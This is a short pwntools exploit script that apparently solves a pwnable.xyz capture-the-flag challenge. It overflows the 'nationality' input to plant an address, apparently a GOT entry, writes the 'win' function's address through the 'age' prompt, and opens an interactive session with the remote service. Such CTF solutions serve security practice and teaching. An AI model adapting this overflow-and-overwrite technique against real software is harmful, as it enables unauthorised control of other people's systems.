#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./challenge',checksec=False)
#p = process()
p = remote('svc.pwnable.xyz',30031)
#gdb.attach(p,gdbscript='''
#           b*main+141
#           b*main+191
#           b*main+234
#           b*auth+8
#           ''')
#input()
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'nationality: ',b'a'*16+p64(0x603018))
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'age: ',str(exe.sym.win))
p.sendlineafter(b'> ',b'4')

p.interactive()
